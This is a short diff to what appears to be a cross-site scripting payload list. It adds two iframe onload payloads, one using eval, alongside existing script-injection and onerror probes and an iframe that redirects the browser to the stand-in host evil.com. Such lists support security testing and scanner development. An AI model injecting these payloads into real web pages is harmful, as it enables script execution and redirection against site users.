@@ -1,4 +1,6 @@
 <iframe onload="window.location='https://evil.com'"></iframe> 
+<iframe onload="eval('alert(\'Reflected XSS\')')"></iframe>
+<iframe onload="alert('XSS');"></iframe>
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
 "><script>alert('XSS')</script>
 "><img src=x onerror=alert('XSS')>
